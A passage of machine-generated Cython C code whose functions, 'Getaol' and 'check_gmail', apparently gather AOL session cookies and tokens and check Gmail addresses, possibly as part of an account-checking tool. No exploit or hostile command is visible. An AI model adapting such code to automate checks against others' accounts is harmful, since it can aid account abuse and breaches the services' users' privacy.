              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_4 = PyTuple_Pack(3, __pyx_t_10, __pyx_t_6, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 364, __pyx_L21_except_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_4, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 364, __pyx_L21_except_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = __Pyx_PyObject_IsTrue(__pyx_t_16);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              if (__pyx_t_17 < 0) __PYX_ERR(0, 364, __pyx_L21_except_error)
              __pyx_t_18 = ((!(__pyx_t_17 != 0)) != 0);
              if (__pyx_t_18) {
                __Pyx_GIVEREF(__pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                __Pyx_XGIVEREF(__pyx_t_5);
                __Pyx_ErrRestoreWithState(__pyx_t_10, __pyx_t_6, __pyx_t_5);
                __pyx_t_10 = 0; __pyx_t_6 = 0; __pyx_t_5 = 0; 
                __PYX_ERR(0, 364, __pyx_L21_except_error)
              }
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              goto __pyx_L20_exception_handled;
            }
            __pyx_L21_except_error:;
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_11, __pyx_t_15);
            goto __pyx_L3_error;
            __pyx_L20_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_11, __pyx_t_15);
            __pyx_L24_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_13) {
              __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__33, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 364, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            }
            goto __pyx_L18;
          }
          __pyx_L18:;
        }
        goto __pyx_L28;
        __pyx_L15_error:;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L3_error;
        __pyx_L28:;
      }

      
      /*with:*/ {
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__38, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 367, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 367, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 367, __pyx_L29_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 367, __pyx_L29_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __pyx_t_6;
        __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_15, &__pyx_t_11, &__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_15);
            __Pyx_XGOTREF(__pyx_t_11);
            __Pyx_XGOTREF(__pyx_t_12);
            /*try:*/ {
              __pyx_v_g = __pyx_t_10;
              __pyx_t_10 = 0;

              
              __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_g, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 368, __pyx_L33_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_cookies); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 368, __pyx_L33_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_t_6, __pyx_kp_u__5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 368, __pyx_L33_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              __pyx_t_6 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
                __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
                if (likely(__pyx_t_6)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                  __Pyx_INCREF(__pyx_t_6);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_5, function);
                }
              }
              __pyx_t_10 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 368, __pyx_L33_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

              
            }
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L38_try_end;
            __pyx_L33_error:;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("source.Getaol", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 367, __pyx_L35_except_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_6 = PyTuple_Pack(3, __pyx_t_10, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 367, __pyx_L35_except_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_6, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 367, __pyx_L35_except_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_18 = __Pyx_PyObject_IsTrue(__pyx_t_16);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              if (__pyx_t_18 < 0) __PYX_ERR(0, 367, __pyx_L35_except_error)
              __pyx_t_17 = ((!(__pyx_t_18 != 0)) != 0);
              if (__pyx_t_17) {
                __Pyx_GIVEREF(__pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_5);
                __Pyx_XGIVEREF(__pyx_t_4);
                __Pyx_ErrRestoreWithState(__pyx_t_10, __pyx_t_5, __pyx_t_4);
                __pyx_t_10 = 0; __pyx_t_5 = 0; __pyx_t_4 = 0; 
                __PYX_ERR(0, 367, __pyx_L35_except_error)
              }
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              goto __pyx_L34_exception_handled;
            }
            __pyx_L35_except_error:;
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ExceptionReset(__pyx_t_15, __pyx_t_11, __pyx_t_12);
            goto __pyx_L3_error;
            __pyx_L34_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ExceptionReset(__pyx_t_15, __pyx_t_11, __pyx_t_12);
            __pyx_L38_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_13) {
              __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__33, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 367, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_12);
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            goto __pyx_L32;
          }
          __pyx_L32:;
        }
        goto __pyx_L42;
        __pyx_L29_error:;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L3_error;
        __pyx_L42:;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_14) {
      __Pyx_AddTraceback("source.Getaol", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_10) < 0) __PYX_ERR(0, 369, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_INCREF(__pyx_t_5);
      __pyx_v_e = __pyx_t_5;
      /*try:*/ {

        
        __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_e); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 370, __pyx_L48_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_Getaol); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 371, __pyx_L48_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_19 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_6 = (__pyx_t_19) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_19) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 371, __pyx_L48_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L49;
        }
        __pyx_L48_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_13 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_15, &__pyx_t_16, &__pyx_t_22);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_13, &__pyx_t_12, &__pyx_t_11) < 0)) __Pyx_ErrFetch(&__pyx_t_13, &__pyx_t_12, &__pyx_t_11);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_12);
          __Pyx_XGOTREF(__pyx_t_11);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_22);
          __pyx_t_14 = __pyx_lineno; __pyx_t_20 = __pyx_clineno; __pyx_t_21 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_22);
            __Pyx_ExceptionReset(__pyx_t_15, __pyx_t_16, __pyx_t_22);
          }
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_12);
          __Pyx_XGIVEREF(__pyx_t_11);
          __Pyx_ErrRestore(__pyx_t_13, __pyx_t_12, __pyx_t_11);
          __pyx_t_13 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_22 = 0;
          __pyx_lineno = __pyx_t_14; __pyx_clineno = __pyx_t_20; __pyx_filename = __pyx_t_21;
          goto __pyx_L5_except_error;
        }
        __pyx_L49:;
      }
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_AddTraceback("source.Getaol", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_qq);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_tm1);
  __Pyx_XDECREF(__pyx_v_specData);
  __Pyx_XDECREF(__pyx_v_specId);
  __Pyx_XDECREF(__pyx_v_crumb);
  __Pyx_XDECREF(__pyx_v_sessionIndex);
  __Pyx_XDECREF(__pyx_v_acrumb);
  __Pyx_XDECREF(__pyx_v_t);
  __Pyx_XDECREF(__pyx_v_g);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_17check_gmail(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_17check_gmail = {"check_gmail", (PyCFunction)__pyx_pw_6source_17check_gmail, METH_O, 0};
static PyObject *__pyx_pw_6source_17check_gmail(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check_gmail (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_16check_gmail(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_16check_gmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_o = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_ok = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_gg = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *(*__pyx_t_17)(PyObject *);
  Py_ssize_t __pyx_t_18;
  Py_UCS4 __pyx_t_19;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check_gmail", 0);
  __Pyx_INCREF(__pyx_v_email);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__39, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 380, __pyx_L3_error)
      __pyx_t_5 = (__pyx_t_4 != 0);
      if (__pyx_t_5) {

        
        __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_email); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 381, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_7 = PyUnicode_Split(((PyObject*)__pyx_t_6), __pyx_kp_u__39, -1L); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 381, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_GetItemInt_List(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 381, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF_SET(__pyx_v_email, __pyx_t_6);
        __pyx_t_6 = 0;

        
      }

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_10);
        /*try:*/ {

          
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 384, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_read); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 384, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_7 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 384, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 384, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 384, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_GetItemInt(__pyx_t_6, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 384, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_v_o = __pyx_t_12;
          __pyx_t_12 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        goto __pyx_L15_try_end;
        __pyx_L10_error:;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_13) {
          __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_12, &__pyx_t_6, &__pyx_t_7) < 0) __PYX_ERR(0, 385, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_GOTREF(__pyx_t_7);

          
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 386, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_read); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 386, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __pyx_t_15 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_14 = (__pyx_t_15) ? __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_15) : __Pyx_PyObject_CallNoArg(__pyx_t_16);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 386, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 386, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_11 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_16);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 386, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_GetItemInt(__pyx_t_11, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 386, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF_SET(__pyx_v_o, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          goto __pyx_L11_exception_handled;
        }
        goto __pyx_L12_except_error;
        __pyx_L12_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_8);
